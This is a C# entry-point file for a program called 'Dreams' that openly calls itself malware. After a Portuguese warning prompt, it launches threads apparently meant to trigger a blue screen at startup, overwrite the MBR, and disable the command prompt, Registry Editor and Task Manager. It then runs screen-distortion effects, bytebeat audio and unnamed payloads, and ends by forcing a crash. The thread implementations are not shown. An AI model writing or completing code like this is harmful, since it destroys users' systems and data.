using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using static Vanara.PInvoke.User32;
using Vanara.PInvoke;
using static Vanara.PInvoke.Kernel32;
using static Dreams.Threads;
using static Dreams.GDI;
using static Dreams.ByteBeats;

namespace Dreams
{
    public class _Main_
    {
        public static int Main()
        {
            DialogResult aviso = System.Windows.Forms.MessageBox.Show("Isso é um malware quer executar?", "! Aviso !", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (aviso == DialogResult.Yes)
            {
                tBSODAoIniciarWindows.Start();
                tMBR.Start();
                tCMD.Start();
                tRegedit.Start();
                tTaskMGR.Start();
                Sleep(1000 * 5);
                bytebeat1.Start();
                Sleep(1000 * 8);
                gdi1.Start();
                Sleep(1000 * 15);
                text.Start();
                Sleep(1000 * 25);
                gdi2.Start();
                Sleep(1000 * 18);
                gdi3.Start();
                Sleep(1000 * 20);
                gdi4.Start();
                Sleep(1000 * 20);
                gdi4.Abort();
                gdi2.Abort();
                gdi3.Abort();
                bytebeat1.Abort();
                bytebeat2.Start();
                payload1.Start();
                gdi5.Start();
                Sleep(1000 * 20);
                gdi5.Abort();
                bytebeat2.Abort();
                bytebeat3.Start();
                gdi6.Start();
                payload2.Start();
                Sleep(1000 * 24);
                bytebeat3.Abort();
                bytebeat4.Start();
                gdi6.Abort();
                gdi1.Abort();
                gdi7.Start();
                Sleep(1000 * 25);
                tBSOD.Start();

            }
            else
            {
                return 0;
            }
            return 0;
        }
    }
}
